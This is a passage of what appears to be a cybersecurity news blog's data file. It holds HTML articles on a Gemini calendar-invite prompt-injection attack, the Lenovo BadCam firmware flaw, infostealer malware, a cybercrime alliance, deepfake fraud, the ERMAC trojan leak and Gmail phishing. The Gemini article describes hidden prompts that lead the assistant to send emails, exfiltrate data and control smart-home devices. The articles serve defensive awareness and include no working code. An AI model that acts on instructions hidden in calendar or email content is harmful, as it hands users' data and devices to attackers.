  `},{id:"gemini-calendar-exploit-2025",title:"Gemini Exploited via Weaponized Calendar Invites",subtitle:"Google’s AI Assistant Abused to Steal Emails and Control Devices",date:"2025-08-08",author:"EthicalByte",summary:"calendar invites, hidden prompts, smart-home hijacks, high-risk Promptware, now patched.",tags:["AI Security","Prompt Injection","Google Gemini","Cyber Attacks","2025"],imageKey:"geminicalendarexploitbanner",content:`
    <div style="background-color:#f8f9fa;padding:20px;border-radius:12px;border:1px solid #ddd;">

      <div style="text-align:center;"><br>
        <h3 style="color:#212529;">🛡️ Gemini Exploited via Weaponized Calendar Invites</h3><br>
        <p style="font-style:italic;">Google’s AI Assistant Abused to Steal Emails and Control Devices</p>
      </div>

      <section style="margin-top:20px;">
        <h3 style="color:#007bff;">🧠 What Happened</h3><br>
        <p>A newly discovered vulnerability chain targets Google's Gemini AI assistant via malicious calendar invites and weaponized email prompts. These indirect prompt injections are part of a growing trend called <strong>Targeted Promptware Attacks</strong>.</p>
        <p>The attacker embeds harmful prompts inside calendar event descriptions or email content. When Gemini processes these, it treats them as user instructions — bypassing user intent and executing unintended commands.</p>
      </section>

      <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
        <h3 style="color:#856404;">⚙️ How the Exploit Works</h3><br>
        <ol>
          <li>Attacker sends a crafted calendar invite or Gmail with hidden prompts inside descriptions or metadata.</li>
          <li>Gemini automatically processes the content when triggered by user interaction or background sync.</li>
          <li>The assistant executes unintended commands — including sending emails, accessing documents, or controlling smart devices.</li>
        </ol>
        <p>This process is completely invisible to the user — making it a <strong>zero-interaction exploit vector</strong>.</p>
      </section>

      <section style="margin-top:20px;">
        <h3 style="color:#dc3545;">🚨 Key Risks Identified</h3><br>
        <ul>
          <li>✅ 73% success rate in enterprise-level threat simulations</li>
          <li>🔓 Full access to Gmail, Google Docs, Calendar & Drive</li>
          <li>🎛️ Unauthorized control of connected smart home devices (lights, cameras, locks)</li>
          <li>📹 Covert streaming of Google Meet sessions without participant awareness</li>
          <li>📤 Silent data exfiltration via auto-forwarded emails or AI-generated summaries</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h3 style="color:#007bff;">📉 Why It Matters</h3><br>
        <p>This is a textbook case of <strong>prompt injection without prompting</strong>. Users don’t even need to engage — the AI assistant does it for them. Calendar invites and emails are now double-edged swords: productivity tools and possible payload vectors.</p>
        <p>With AI models becoming default handlers for messages, calendars, and tasks — prompt-layer abuse is inevitable unless controls are built in.</p>
      </section>

      <section style="margin-top:20px;background:#cce5ff;padding:15px;border-radius:8px;">
        <h3 style="color:#004085;">🧩 Technical Analysis</h3><br>
        <p>Gemini’s NLP pipeline doesn’t distinguish between user-intended content and attacker-embedded instructions. The model parses the entire content field without proper context validation, leading to unexpected behavior.</p>
        <p>This type of <strong>context collapse</strong> is critical in LLMs that auto-process user data from various surfaces (like calendar, chat, email).</p>
        <ul>
          <li>Input parsing lacks strict role-based separation</li>
          <li>No guardrails on background AI actions triggered via system-level integrations</li>
          <li>Prompt injection filters only apply to chat UI, not system triggers</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h3 style="color:#155724;">✅ Mitigations</h3><br>
        <ul>
          <li>🛡️ Enable sandbox execution modes for calendar/email parsing</li>
          <li>🚫 Disable auto-execution of assistant actions without user confirmation</li>
          <li>🧽 Sanitize structured content (i.e., event metadata) before ingestion</li>
          <li>🧠 Context-separation models for input isolation</li>
          <li>📚 User education on AI-triggering metadata (event notes, descriptions)</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
        <h3 style="color:#155724;">🔮 Final Thoughts</h3><br>
        <p>This exploit underlines a major blindspot in AI integration — invisible inputs with powerful outcomes.</p>
        <p>It’s time to treat AI assistants as programmable interfaces, not static tools. That means adding logs, alerts, approval workflows, and context filters — just like any other endpoint.</p>
        <p>As attackers shift their focus from users to the AI agents acting on their behalf, defenders must adapt — or the assistant becomes the insider threat.</p>
      </section>

    </div>
  `},{id:"lenovo-badcam-exploit-2025",title:"⚡️ Lenovo Webcams Hacked into Remote BadUSB Weapons",subtitle:"Flawed firmware turns cameras into covert cyber weapons",date:"2025-08-11",author:"EthicalByte",summary:"Lenovo “BadCam” Exploit – A firmware flaw in certain Linux-based Lenovo webcams lets attackers turn them into BadUSB weapons. Malicious updates can inject keystrokes, survive system wipes, and spread to other devices — making everyday webcams a stealthy, persistent cyber threat.",tags:["Firmware Security","Lenovo","BadUSB","Cyber Attacks","2025"],imageKey:"lenovobadcamexploitbanner",content:`
     <div style="background-color:#f8f9fa;padding:20px;border-radius:12px;border:1px solid #ddd;">

      <div style="text-align:center;"><br>
        <h3 style="color:#212529;">⚡ Lenovo Webcams Can Be Hacked into Remote BadUSB Weapons</h3><br>
        <p style="font-style:italic;">Firmware Flaw Allows Keystroke Injection, Persistence, and Cross-Host Infection</p>
      </div>

      <section style="margin-top:20px;">
        <h3 style="color:#007bff;">🧠 What Happened</h3><br>
        <p>Security researchers have uncovered a critical vulnerability in select Linux-based Lenovo webcams that lets attackers transform them into <strong>BadUSB-style attack devices</strong>. The exploit, dubbed <strong>“BadCam”</strong>, abuses flawed firmware update checks to gain deep control over the camera hardware.</p>
        <p>Once compromised, the webcam can inject malicious keystrokes, survive system wipes, and even infect other machines it connects to.</p>
      </section>

      <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
        <h3 style="color:#856404;">⚙️ How the “BadCam” Exploit Works</h3><br>
        <ol>
          <li>Attacker delivers a malicious firmware payload — either remotely via a compromised update channel or physically by swapping the device.</li>
          <li>The webcam’s flawed validation process accepts the rogue firmware without cryptographic checks.</li>
          <li>Once infected, the device can impersonate a USB keyboard and inject keystrokes into the host system.</li>
          <li>It maintains persistence across OS reinstalls and can re-infect other connected systems.</li>
        </ol>
        <p>This effectively turns a harmless webcam into a covert cyber weapon.</p>
      </section>

      <section style="margin-top:20px;">
        <h3 style="color:#dc3545;">🚨 Key Risks Identified</h3><br>
        <ul>
          <li>🔓 Full host compromise via keystroke injection</li>
          <li>♻️ Persistent malware that survives OS wipes</li>
          <li>📤 Cross-host propagation via removable devices</li>
          <li>🕵️ Covert data exfiltration and command execution</li>
          <li>⚠️ Potential weaponization in supply chain attacks</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h3 style="color:#007bff;">📉 Why It Matters</h3><br>
        <p>USB-based firmware attacks have long been a stealthy hacker favorite. “BadCam” makes them easier than ever, thanks to consumer devices with weak update integrity checks. This turns everyday peripherals into long-term footholds for attackers.</p>
      </section>

      <section style="margin-top:20px;background:#cce5ff;padding:15px;border-radius:8px;">
        <h3 style="color:#004085;">🧩 Technical Analysis</h3><br>
        <p>The vulnerability lies in the camera’s firmware update process, which:</p>
        <ul>
          <li>Does not enforce signed firmware validation</li>
          <li>Allows firmware downgrade to vulnerable versions</li>
          <li>Permits arbitrary USB HID (Human Interface Device) profile switching</li>
        </ul>
        <p>This combination allows attackers to transform the webcam into a programmable BadUSB platform capable of launching low-level attacks undetected.</p>
      </section>

      <section style="margin-top:20px;">
        <h3 style="color:#155724;">✅ Mitigations</h3><br>
        <ul>
          <li>🛡️ Deploy signed firmware with cryptographic integrity checks</li>
          <li>🚫 Disable USB HID emulation in non-keyboard devices</li>
          <li>📦 Restrict firmware updates to secure, vendor-controlled channels</li>
          <li>🧠 Train users to treat peripheral firmware updates as high-risk operations</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
        <h3 style="color:#155724;">🔮 Final Thoughts</h3><br>
        <p>BadCam is a wake-up call: any USB device with updatable firmware can be a Trojan horse.</p>
        <p>Vendors must treat firmware signing and validation as non-negotiable, and enterprises should enforce strict device trust policies — before a harmless webcam becomes a hacker’s beachhead.</p>
      </section>

    </div>
  `},{id:"malware-threats-2025",title:"Top 5 Malware Threats to Watch Out for in 2025",subtitle:"AI-powered evasion, stealth delivery, and dark web scaling — here’s what’s coming.",date:"2025-08-12",author:"EthicalByte",summary:"AI-powered, stealthy, service-based, fueled by dark web data, and fully automated.",tags:["malware","cybersecurity","threats","2025"],imageKey:"malwareTop5",content:`
    <section style="font-family: Arial, sans-serif; color: #f5f5f5; background: linear-gradient(135deg, #0a0f24, #162447); padding: 20px; border-radius: 12px;">
      <h3 style="background: linear-gradient(90deg, #ff4d4d, #ff9966); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-size: 2.4em; font-weight: bold;">🚨 Top 5 Malware Threats to Watch Out for in 2025</h3><br>
      <p style="font-size: 1.1em; line-height: 1.6;">
        Cybersecurity researchers are raising alarms about the most dangerous malware families expected to dominate in 2025. 
        These threats are becoming more sophisticated — using AI-powered evasion, stealth delivery mechanisms, and dark web marketplaces to scale attacks.
      </p>
      <p style="font-size: 1em; color: #ccc;">
        The shift to remote work, cloud services, and IoT devices is giving cybercriminals a bigger attack surface than ever before.
      </p>
    </section>

    <section style="background: linear-gradient(135deg, #13294b, #1f4068); padding: 20px; margin-top: 15px; border-radius: 10px;">
      <h3 style="background: linear-gradient(90deg, #ffcc00, #ffdd66); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">🛡 The Big 5 Threats of 2025</h3><br>
      <ol style="font-size: 1em; line-height: 1.8; color: #ddd;">
        <li><strong>Lumma Stealer</strong> – Advanced info-stealer that targets browser data, crypto wallets, and saved credentials. Known for spreading through fake login pages, phishing emails, and malicious CAPTCHA verifications.</li>
        <li><strong>Agent Tesla</strong> – Long-standing spyware/keylogger that can record keystrokes, capture screenshots, and exfiltrate credentials via SMTP or FTP. Frequently updated to evade detection.</li>
        <li><strong>RedLine Stealer</strong> – A malware-as-a-service (MaaS) platform that even amateur hackers can rent. Targets browsers, FTP clients, and VPN credentials.</li>
        <li><strong>Vidar</strong> – Modular info-stealer capable of adding custom plugins for deeper infiltration. Known for using cracked software downloads as a delivery vector.</li>
        <li><strong>FormBook</strong> – Veteran malware still active after years, using macro-enabled documents and drive-by downloads to steal credentials and form data.</li>
      </ol>
    </section>

    <section style="background: linear-gradient(135deg, #1f1c2c, #928DAB); padding: 20px; margin-top: 15px; border-radius: 10px;">
      <h3 style="background: linear-gradient(90deg, #66ffcc, #00e6b8); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">🌀 How They Spread</h3><br>
      <ul style="font-size: 1em; line-height: 1.6; color: #ddd;">
        <li>🎣 <strong>Phishing Campaigns</strong> – Fake login portals, fraudulent invoices, and targeted spear-phishing emails.</li>
        <li>📎 <strong>Malicious Attachments</strong> – PDF, Word, and Excel files with embedded malware scripts.</li>
        <li>💻 <strong>Software Cracks</strong> – Freeware and pirated software downloads laced with trojans.</li>
        <li>🌐 <strong>Compromised Websites</strong> – Drive-by downloads from infected or hijacked sites.</li>
      </ul>
    </section>

    <section style="background: linear-gradient(135deg, #3a1c71, #d76d77, #ffaf7b); padding: 20px; margin-top: 15px; border-radius: 10px;">
      <h3 style="background: linear-gradient(90deg, #ff9966, #ffcc99); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">🗓️ Notable 2025 Incidents</h3><br>
      <p>
        In Q1 2025 alone, Lumma Stealer was linked to over <strong>1.2 million compromised accounts</strong>. 
        RedLine Stealer campaigns have been spotted targeting cryptocurrency traders, while Agent Tesla variants are now bypassing some endpoint security tools.
      </p>
    </section>

    <section style="background: linear-gradient(135deg, #283c86, #45a247); padding: 20px; margin-top: 15px; border-radius: 10px;">
      <h3 style="background: linear-gradient(90deg, #66ff99, #99ffcc); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">🛡 Mitigation Tips</h3><br>
      <ul style="font-size: 1em; line-height: 1.6; color: #ddd;">
        <li>Enable multi-factor authentication (MFA) for all accounts.</li>
        <li>Use endpoint protection with behavior-based detection.</li>
        <li>Educate employees about phishing and social engineering tactics.</li>
        <li>Keep operating systems, browsers, and plugins updated.</li>
        <li>Regularly back up important files to offline storage.</li>
      </ul>
    </section>

    <section style="padding: 20px; margin-top: 15px; background: linear-gradient(135deg, #1e3c72, #2a5298); border-radius: 10px;">
      <h3 style="background: linear-gradient(90deg, #66ccff, #99ddff); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">📝 Final Take</h3><br>
      <p>
        2025 is shaping up to be a battleground year between cyber defenders and increasingly advanced info-stealers. 
        Whether you’re an individual user or a large enterprise, proactive security practices are no longer optional — they’re a survival necessity.
      </p>
    </section>
  `},{id:"shinyhunters-scatteredspider-alliance-2025",title:"ShinyHunters & Scattered Spider Join Forces — A Dangerous Cyber Alliance Emerges",subtitle:"Salesforce users under attack, banks and financial firms could be next",date:"2025-08-13",summary:"ShinyHunters and Scattered Spider, two of the world’s most dangerous cybercrime groups, have teamed up. After targeting Salesforce users globally, experts warn their next focus could be banks and financial institutions — making this alliance a major threat to global cybersecurity.",author:"EthicalByte",tags:["Cybercrime","Threat Intelligence","Banking Security","Hacker Groups"],imageKey:"shinyspider2025",content:`
    <section style="padding: 20px; font-family: Arial, sans-serif; background: linear-gradient(135deg, #1a1f3b, #3b0066); color: white;">
      <h3 style="font-size: 28px; margin-bottom: 15px; color: #ffcc00;">⚠️ ShinyHunters + Scattered Spider: A Cybercrime Super-Team</h3><br>
      <p style="font-size: 16px; line-height: 1.6;">
        Two of the most dangerous cybercriminal groups in recent years — <strong>ShinyHunters</strong> and <strong>Scattered Spider</strong> — have joined forces, combining their unique skill sets into one high-powered cybercrime syndicate. 
        This alliance represents a massive leap in the threat landscape, and early indicators suggest they’re already executing coordinated campaigns with alarming precision.
      </p>
    </section>

    <section style="padding: 20px; background: linear-gradient(135deg, #330066, #660033); color: white;">
      <h3 style="color: #ffcc00;">🚨 What Happened?</h3><br>
      <p style="font-size: 16px; line-height: 1.6;">
        Cybersecurity researchers have confirmed multiple overlapping attack signatures from both groups in ongoing <strong>Salesforce-targeted phishing waves</strong>. 
        The attacks involve fraudulent login portals, MFA bypass attempts, and credential harvesting infrastructure hosted across multiple countries.
      </p>
      <p style="font-size: 16px; line-height: 1.6;">
        The real concern: evidence from dark web forums suggests this partnership is only phase one — with <strong>banking networks, fintech companies, and payment processors</strong> already being probed for weaknesses.
      </p>
    </section>

    <section style="padding: 20px; background: linear-gradient(135deg, #003366, #001a33); color: white;">
      <h3 style="color: #ffcc00;">💡 Why This Alliance is a Game-Changer</h3><br>
      <ul style="font-size: 16px; line-height: 1.6; padding-left: 20px;">
        <li><strong>ShinyHunters</strong> — infamous for large-scale data breaches, including millions of leaked credentials from top tech firms.</li>
        <li><strong>Scattered Spider</strong> — masters of social engineering and SIM swapping attacks against corporate networks.</li>
        <li>Combining breach expertise with advanced impersonation tactics creates a <em>full-spectrum attack capability</em>.</li>
        <li>Their combined intel-sharing means faster, more adaptive campaigns that bypass traditional defenses.</li>
      </ul>
    </section>

    <section style="padding: 20px; background: linear-gradient(135deg, #330000, #660000); color: white;">
      <h3 style="color: #ffcc00;">🛡️ Immediate Defense Measures</h3><br>
      <ul style="font-size: 16px; line-height: 1.6; padding-left: 20px;">
        <li>Enforce <strong>multi-factor authentication</strong> for all accounts — preferably hardware-based tokens.</li>
        <li>Implement <strong>phishing-resistant login flows</strong> with conditional access policies.</li>
        <li>Run <strong>threat hunting exercises</strong> to identify suspicious logins and data exfiltration attempts.</li>
        <li>Educate employees on spear-phishing red flags and deepfake-based impersonations.</li>
      </ul>
    </section>

    <section style="padding: 20px; background: linear-gradient(135deg, #001a1a, #003333); color: white;">
      <h3 style="color: #ffcc00;">🔍 Final Thoughts</h3><br>
      <p style="font-size: 16px; line-height: 1.6;">
        This isn’t just two hacking crews working together — it’s a sign of organized cybercrime’s evolution into multi-specialist joint ventures. 
        Financial institutions, SaaS providers, and global enterprises should prepare for attacks that merge multiple breach vectors into a single, coordinated assault.
      </p>
      <p style="font-size: 16px; line-height: 1.6;">
        If left unchecked, the <strong>ShinyHunters–Scattered Spider</strong> alliance could set a dangerous precedent, encouraging other groups to merge resources for even greater damage potential.
      </p>
    </section>
  `},{id:"ai-ml-innovations-aug-2025",title:"AI and Machine Learning Innovations Powering the Future",subtitle:"From edge computing breakthroughs to AI-powered decision-making, here’s what’s shaping the AI landscape in August 2025",date:"2025-08-13",summary:"AI/ML systems face growing threats like data poisoning, model theft, and adversarial attacks, demanding stronger security and monitoring.",author:"EthicalByte",tags:["AI","Machine Learning","Innovation","Tech Trends","Automation","Data Science"],imageKey:"aimlinnovations2025",content:`
    <section style="padding: 20px; font-family: Arial, sans-serif; line-height: 1.6; background-color: #eaf6f6; border-radius: 8px;">
  <h3 style="color: #006d77;">AI and Machine Learning – The August 2025 Evolution</h3><br>
  <p style="color: #264653;">Artificial Intelligence (AI) and Machine Learning (ML) continue to break technological boundaries, transforming industries and influencing every corner of the digital ecosystem. This month’s developments highlight not only advancements in computational capability but also the real-world integration of AI in security, healthcare, business operations, and personal productivity. Here’s a deep dive into the most impactful trends making waves in August 2025.</p>
</section>

<section style="padding: 20px; background-color: #fefae0; border-radius: 8px; margin-top: 15px;">
  <h3 style="color: #e76f51;">AI at the Edge – Bringing Intelligence Closer to Data</h3><br>
  <p style="color: #264653;">Edge AI is no longer a futuristic concept—it’s becoming a necessity. By running AI models directly on edge devices (such as IoT sensors, security cameras, and mobile devices), organizations can process data in real-time without relying on cloud latency. This is especially critical in industries like autonomous vehicles, predictive maintenance in manufacturing, and on-the-spot health diagnostics.</p>
  <p style="color: #264653;">Recent breakthroughs have reduced the model size and power requirements, enabling advanced neural networks to run efficiently even on low-energy devices. This not only improves performance but also strengthens data privacy, as sensitive information never needs to leave the device.</p>
</section>

<section style="padding: 20px; background-color: #edf6f9; border-radius: 8px; margin-top: 15px;">
  <h3 style="color: #006d77;">Generative AI in Decision-Making</h3><br>
  <p style="color: #264653;">Generative AI is moving beyond content creation into complex decision-support systems. Businesses are deploying large language models (LLMs) to analyze market trends, simulate future scenarios, and recommend strategic actions. For example, in the financial sector, generative AI is now used to predict investment risks and optimize portfolios with human-like reasoning, all while explaining the “why” behind its recommendations.</p>
  <p style="color: #264653;">The rise of “Explainable Generative AI” (XGAI) is also helping organizations trust AI outputs by offering transparency on decision logic, critical for compliance-heavy sectors such as healthcare and law.</p>
</section>

<section style="padding: 20px; background-color: #fefae0; border-radius: 8px; margin-top: 15px;">
  <h3 style="color: #e76f51;">AI-Augmented Cybersecurity</h3><br>
  <p style="color: #264653;">In 2025, the cyber threat landscape has evolved to match the capabilities of AI—malware is more adaptive, phishing campaigns more convincing, and intrusion attempts more stealthy. In response, AI-powered threat detection systems are becoming the first line of defense. They can identify anomalies in network traffic within milliseconds, recognize patterns indicative of zero-day attacks, and even initiate automated incident response protocols without human intervention.</p>
  <p style="color: #264653;">However, this arms race between AI-driven attacks and AI-powered defense means cybersecurity teams must continuously train their models with fresh threat intelligence to stay ahead of adversaries.</p>
</section>

<section style="padding: 20px; background-color: #edf6f9; border-radius: 8px; margin-top: 15px;">
  <h3 style="color: #006d77;">Ethical AI Governance</h3><br>
  <p style="color: #264653;">With AI's capabilities expanding rapidly, global regulators and tech giants are prioritizing AI governance frameworks. August 2025 has seen the release of new international guidelines on AI fairness, bias mitigation, and accountability. These aim to prevent discriminatory outcomes in hiring algorithms, lending systems, and criminal justice applications.</p>
  <p style="color: #264653;">Companies are also embedding AI Ethics Officers into their teams to oversee AI project compliance and ensure alignment with societal values. This is becoming a competitive differentiator as consumers increasingly choose brands they trust with their data.</p>
</section>

<section style="padding: 20px; background-color: #fefae0; border-radius: 8px; margin-top: 15px;">
  <h3 style="color: #e76f51;">AI-Driven Scientific Discovery</h3><br>
  <p style="color: #264653;">Machine Learning is accelerating breakthroughs in scientific research. From drug discovery that once took a decade now being compressed into months, to climate models that can simulate decades of environmental change in hours—AI is redefining what’s possible.</p>
  <p style="color: #264653;">In August 2025, collaborative AI platforms are being launched where researchers can share pre-trained models tailored for niche fields, enabling smaller labs to tap into the computational power once reserved for billion-dollar organizations.</p>
</section>

<section style="padding: 20px; background-color: #eaf6f6; border-radius: 8px; margin-top: 15px;">
  <h3 style="color: #006d77;">Final Thoughts</h3><br>
  <p style="color: #264653;">The AI and ML ecosystem is shifting from experimental adoption to mission-critical integration. The innovations emerging this month prove that AI is not just a tool—it’s an active collaborator in problem-solving, creativity, and decision-making. As we move forward, the challenge will be balancing rapid technological progress with responsible and ethical deployment.</p>
  <p style="color: #264653;">In short, August 2025 reinforces a truth we can no longer ignore: AI isn’t coming for the future—it is the future.</p>
</section>

  `},{id:"ai-deepfake-cyberattacks-2025",title:"AI Deepfakes Are the New Cyber Weapon",subtitle:"Hackers are now using AI to bypass trust, create fake identities, and attack at machine speed.",date:"2025-08-17",summary:"Hackers are now using AI to deepfake your CFO’s voice, create perfect fake identities, and break into systems at machine speed.",author:"EthicalByte",tags:["AI","Deepfake","Cybersecurity","Identity Theft","Webinar"],imageKey:"aideepfakecyberattacks",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#ffeaea,#fff); border-radius:8px;">
  <h3 style="color:#d62828; text-shadow:1px 1px #ffb3b3;">🚨 The Next Wave of AI-Powered Attacks</h3><br>
  <p>
    Cybercriminals are stepping up their game with <b style="color:#e63946;">AI-driven deepfakes</b>, 
    capable of cloning voices, creating realistic fake identities, 
    and even launching attacks at <b style="color:#f77f00;">machine speed</b>. 
    One of the scariest realities is that attackers can now impersonate 
    a <b style="color:#9d0208;">CFO’s voice</b> to trick employees into approving wire transfers 
    or confidential deals.
  </p>
</section><br>

<section style="padding:20px; background:#f1f1f1; border-left:6px solid #1d3557; border-radius:8px;">
  <h3 style="color:#1d3557;">🔑 Why This Matters</h3><br>
  <p>
    The real frontline of security is no longer the firewall — 
    it’s your <b style="color:#457b9d;">login screen</b> and <b style="color:#2a9d8f;">identity verification systems</b>. 
    Deepfake AI can bypass traditional defenses by exploiting human trust 
    instead of brute-forcing code.
  </p>
</section><br>

<section style="padding:20px; background:#edf6f9; border-radius:8px;">
  <h3 style="color:#457b9d;">🛡️ Protecting Your Business</h3><br>
  <p>
    Experts warn that companies need to adopt <b style="color:#e63946;">AI-based detection tools</b>, 
    stronger <b style="color:#6a4c93;">multi-factor authentication</b>, and continuous 
    <b style="color:#2a9d8f;">identity monitoring</b> to defend against these new threats.
  </p>
  <p>
    To dive deeper into how businesses can prepare...
  </p>
</section><br>

<section style="padding:20px; text-align:center; background:linear-gradient(135deg,#e0f7f4,#f8f9fa); border-radius:8px;">
  <h3 style="color:#2a9d8f;">⚡ Stay Ahead of AI Threats</h3><br>
  <p>
    The future of cybercrime is <b style="color:#ff6f00;">AI-powered</b>. 
    If your organization isn’t ready, it’s already at risk. 
    <b style="color:#d62828;">Defense must evolve</b> — because the attackers already have.
  </p>
</section><br>

<section style="padding:20px; background:#fdf0ff; border-radius:8px;">
  <h3 style="color:#6a1b9a;">🎭 Real-World Cases of AI Deepfake Attacks</h3><br>
  <p>
    We’ve already seen cases where fraudsters tricked companies into 
    transferring millions by using <b style="color:#6a1b9a;">AI-cloned voices</b> of executives. 
    In 2023, a multinational firm lost over <b style="color:#e63946;">$35 million</b> after scammers 
    replicated their CFO’s voice with frightening accuracy. 
    Such incidents are no longer rare — they are becoming the <b style="color:#ff6f00;">new norm</b>.
  </p>
</section><br>

<section style="padding:20px; background:#fff3cd; border-radius:8px; border-left:6px solid #ff6f00;">
  <h3 style="color:#ff6f00;">🚫 What Traditional Security Misses</h3><br>
  <p>
    Firewalls, antivirus, and basic email filters can’t detect a 
    <b style="color:#d62828;">synthetic voice call</b> or a <b style="color:#6a4c93;">hyper-realistic video deepfake</b>. 
    Employees are often the weakest link, and attackers know this. 
    By targeting <b style="color:#2a9d8f;">human trust</b> instead of systems, 
    deepfake AI bypasses nearly all old-school defenses.
  </p>
</section><br>

<section style="padding:20px; background:#f0f7ff; border-radius:8px;">
  <h3 style="color:#264653;">📊 The Growing Scale of AI Threats</h3><br>
  <p>
    According to security researchers, AI-powered identity attacks 
    have grown by <b style="color:#e63946;">over 300% in the last two years</b>. 
    With the cost of generative AI tools dropping, 
    even small hacker groups can now deploy large-scale 
    social engineering campaigns that used to be possible only for 
    <b style="color:#6a1b9a;">state-sponsored actors</b>.
  </p>
</section><br>

<section style="padding:20px; background:#fff0f0; border-radius:8px; border-left:6px solid #e63946;">
  <h3 style="color:#e63946;">🚀 The Road Ahead</h3><br>
  <p>
    The battle against deepfake cybercrime will rely on 
    <b style="color:#2a9d8f;">AI fighting AI</b>. 
    Just as attackers use machine learning to deceive, 
    defenders must use it to detect anomalies, flag suspicious behavior, 
    and protect digital identities in real time. 
    Companies that ignore this shift risk becoming 
    the next <b style="color:#d62828;">headline breach</b>.
  </p>
</section><br>

  `},{id:"ermac-v3-android-trojan-leak",title:"ERMAC V3.0 Android Banking Trojan Source Code Leaked",date:"2025-08-18",author:"EthicalByte",summary:"The full source code of ERMAC V3.0 — one of the most dangerous Android banking trojans — has been leaked, exposing its builder, backend, panels, and exfiltration servers. Here’s why this matters.",tags:["ERMAC","AndroidMalware","BankingTrojan","Cybercrime","SourceCodeLeak"],imageKey:"ermacTrojanLeak",content:`
    <div style="background:linear-gradient(135deg,#fdfdfd,#f5f6fa); padding:25px; border-radius:14px; border:1px solid #ddd; font-family:Segoe UI,Arial,sans-serif; line-height:1.6; max-width:850px; margin:0 auto;">

  <h2 style="color:#e11d48; margin-top:0; font-size:1.8em;">🚨 ERMAC V3.0 Source Code Leaked</h2><br>
  <p><strong>ERMAC V3.0</strong> — a dangerous Android banking trojan targeting financial apps, crypto wallets, and personal accounts — has had its <strong>entire source code leaked</strong>, including:</p>

  <ul style="margin:10px 0; padding-left:20px;">
    <li>✅ Backend servers & admin panel</li>
    <li>✅ Builder for new malware variants</li>
    <li>✅ Exfiltration modules</li>
    <li>✅ Default credentials exposed</li>
  </ul>

  <h3 style="color:#2563eb; font-size:1.4em;">🔍 Why This Matters</h3><br>
  <p>This leak lowers the barrier for cybercriminals — even <strong>low-skilled attackers</strong> can now deploy their own malware campaigns.</p>
  <ul>
    <li>📱 Targets <strong>700+ financial apps</strong> (banking, wallets, payments)</li>
    <li>💳 Intercepts <strong>2FA codes</strong></li>
    <li>🛠️ Includes overlay attacks, SMS theft, and keylogging</li>
    <li>⚠️ Easily adaptable for new apps</li>
  </ul>

  <h3 style="color:#ea580c; font-size:1.4em;">📉 The Bigger Picture</h3><br>
  <p>The impact is a <strong>double-edged sword</strong> — defenders gain insight, but cybercrime will likely surge with:</p>
  <ul>
    <li>🚫 More ERMAC variants in the wild</li>
    <li>🌍 Wider global spread</li>
    <li>🕵️ Adoption by new cybercrime groups</li>
  </ul>

  <!-- User Recommendations -->
  <div style="background:#fef2f2; border-left:4px solid #dc2626; padding:15px; margin:20px 0; border-radius:8px;">
    <h3 style="margin-top:0; color:#b91c1c;">🛡️ Recommendations for Users</h3><br>
    <ul style="margin:0; padding-left:20px;">
      <li>🔒 Install apps only from <strong>Google Play</strong></li>
      <li>📱 Regularly check app permissions</li>
      <li>⚠️ Avoid overlays/popups requesting sensitive info</li>
      <li>🛡️ Use mobile security tools with <strong>banking protection</strong></li>
    </ul>
  </div>

  <!-- Enterprise Recommendations -->
  <div style="background:#f0f9ff; border-left:4px solid #2563eb; padding:15px; margin:20px 0; border-radius:8px;">
    <h3 style="margin-top:0; color:#1d4ed8;">🏭 Recommendations for Enterprises</h3><br>
    <ul style="margin:0; padding-left:20px;">
      <li>✅ Monitor mobile endpoints for ERMAC activity</li>
      <li>✅ Train staff on phishing & malicious APK risks</li>
      <li>✅ Subscribe to <strong>threat intelligence feeds</strong></li>
    </ul>
  </div>

  <!-- Final Takeaway -->
  <blockquote style="border-left:4px solid #e11d48; padding-left:1em; font-style:italic; background:#fff7ed; margin:20px 0; border-radius:6px;">
    With ERMAC V3.0’s source code public, the Android threat landscape faces a surge in activity.  
    <strong>For users</strong>: caution is critical.  
    <strong>For enterprises</strong>: proactive defense is the only way forward.
  </blockquote>

  <!-- Mobile-friendly inline responsiveness -->
  <div style="display:none;">
    <style>
      @media (max-width:600px) {
        .ermac-article { padding:15px !important; font-size:0.95em !important; }
        .ermac-article h2 { font-size:1.4em !important; }
        .ermac-article h3 { font-size:1.2em !important; }
        .ermac-article ul { padding-left:18px !important; }
      }
    </style>
  </div>

</div>

  `},{id:"gmail-phishing-attack-2025",title:"Gmail Phishing Campaign Uses Voicemail Lures & Fake Login Flows",summary:"Credential theft at scale with CAPTCHA gates, MFA prompts, and cloaked redirect chains",date:"2025-08-19",author:"EthicalByte",tags:["Phishing","Gmail","Account Security","MFA","Email Security"],imageKey:"gmailPhishVoicemailBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:#eaf6f6; border-radius:10px;">
  <h3 style="color:#006d77;">🛑 What Happened</h3><br>
  <p>
    A widespread <strong>Gmail phishing campaign</strong> has been uncovered, using convincing 
    <b>voicemail and notification emails</b> as bait to lure victims into clicking. Once engaged, 
    targets are funneled through a series of <b>redirects and CAPTCHA challenges</b>, making the 
    attack chain appear more trustworthy while simultaneously frustrating automated security scanners. 
    The final destination is a <strong>highly polished fake Google login page</strong>, 
    designed to steal credentials and bypass multi-factor authentication with alarming precision. 
    Researchers note that the scale, realism, and persistence of this campaign mark it as one of the 
    most dangerous phishing waves seen in 2025.
  </p>
</section>


    <section style="padding:20px; background:#fefae0; border-radius:10px; margin-top:14px;">
      <h3 style="color:#e76f51;">🧭 How the Attack Works</h3><br>
      <ol style="margin-left:18px;">
        <li>User receives a “new voicemail / document” email with a <em>View</em> button.</li>
        <li>Click → redirect chain (often via trusted-looking domains) → human CAPTCHA.</li>
        <li>Landing page mimics Google sign-in; steals email + password.</li>
        <li>Second screen asks for <strong>MFA code</strong> / recovery info → full account takeover.</li>
        <li>Scripts use obfuscation and anti-debugging to evade detection.</li>
